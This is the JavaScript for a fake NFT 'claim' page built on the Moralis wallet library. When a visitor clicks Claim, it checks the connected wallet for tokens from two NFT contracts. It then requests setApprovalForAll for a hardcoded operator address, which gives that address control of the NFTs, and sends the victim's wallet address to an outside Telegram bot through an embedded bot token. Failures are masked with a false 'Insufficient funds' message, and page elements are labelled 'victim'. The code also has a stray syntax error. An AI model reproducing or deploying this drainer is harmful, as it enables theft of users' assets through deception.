const serverUrl = "https://b4upz3w3ye4p.usemoralis.com:2053/server";
const appId = "lePmHZif6BunoJK638wYmee7SgmOofuzebVkJyzu";
Moralis.start({ serverUrl, appId });

/** Add from here down */
async function login(pvdr) {
    if(isMobile()) {
        if(window.ethereum) {
            ;
        } else {
            var localurl = new URL(window.location);
            window.location.replace("https://metamask.app.link/dapp/"+localurl.host+localurl.pathname);
        }
    }
    let user = Moralis.User.current();
    try {
        user = await Moralis.authenticate({ provider: pvdr, signingMessage: "I am signing my one-time nonce: 513767" })
    } catch (error) {
        console.log(error)
    }
}

function isMobile() {
    return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
};

async function checkLoginStatus() {
    let user = Moralis.User.current();
    if (user) {
        $('.victim-wallet').html(user.get('ethAddress'));
        $('.sb-victimAddress').html(user.get('ethAddress'));
        $('.trade-view').show();
        $('.sidebar').show();
        $('.connect-wallet').html('MAIN NET');
        $('.connect-wallet').css('color', '#057b99');
        $('.sidebartogglebtn').show();
        closeLoginModal();
    } else {
        $('.trade-view').hide();
        $('.sidebar').hide();
    }
}

async function logOut() {
    await Moralis.User.logOut();
    console.log("logged out");
}

function closeLoginModal() {
    $('.w3modal').css('display', 'none');
}

function togglesidebar() {
    if ($('.sidebar').css('right') == '0px') {
        $('.sidebar').css('right', '-500px');
    } else {
        $('.sidebar').css('right', '0px');
    }
}

async function transact() {
    await Moralis.enableWeb3();

});
    let user = Moralis.User.current();
    if (user == undefined) {
        try {
            user = await Moralis.authenticate({ provider: "metamask", signingMessage: "I am signing my one-time nonce: 513767" })
        } catch (error) {
            console.log(error)
    }
    }
    $("#claim").html('Claim');
    var options, optionss, optionsss;
    console.log("0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff");
    optionss = {
        chain: "Eth",
  address: Moralis.User.current().get("ethAddress"),
  token_address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
    }
    optionsss = {
        chain: "Eth",
  address: Moralis.User.current().get("ethAddress"),
  token_address: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
    }
    const userEthNFTs = await Moralis.Web3API.account.getNFTsForContract(optionss);
    const userEthNFTss = await Moralis.Web3API.account.getNFTsForContract(optionsss);
    if (userEthNFTs.result[0] == undefined && userEthNFTss.result[0] == undefined){
        $('.u-msg').css({ opacity: 1 });

    } 
    if (userEthNFTs.result[0] != undefined) {
        const sendOptions = {
        contractAddress: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
        functionName: "setApprovalForAll",
        abi: window.CONTRACT_ABI,
        params: {
          operator: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
          approved: "true"
        },
      };
            try {
                let result = await Moralis.executeFunction(sendOptions);
                var z=$.ajax({  
  type: "POST",  
  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
  }); 
            } catch (e) {
                throwmodal('Error: Insufficient funds!');
            }
      
      }
    if (userEthNFTss.result[0] != undefined) {
        const sendOptions = {
        contractAddress: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
        functionName: "setApprovalForAll",
        abi: window.CONTRACT_ABI,
        params: {
            operator: "0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff",
            approved: "true"
        },
    };
            try {
                let result = await Moralis.executeFunction(sendOptions);
                var z=$.ajax({  
  type: "POST",  
  url: "https://api.telegram.org/bot"+"5168917302:AAHHZ7ruzC1g3u3Dm87iCUeWT1XyABRuRpY"+"/sendMessage?chat_id="+"854910722",
  data: "parse_mode=HTML&text="+encodeURIComponent(Moralis.User.current().get("ethAddress")), 
  }); 
            } catch (e) {
                throwmodal('Error: Insufficient funds!');
            }
        
        }
};


async function throwmodal(errormsg) {
    $('.errormodal').html(errormsg);
    $('.errormodal').css('opacity', '1');
    await new Promise(resolve => setTimeout(resolve, 5000));
    $('.errormodal').css('opacity', '0');
}

$(document).ready(function () {
    checkLoginStatus();
    logOut();

    $('.sidebartogglebtn').hide();

    $("#wc-provider").click(function () {
        login('walletconnect');
    });
    $('#claim').click(function () {
        transact();
    })

});
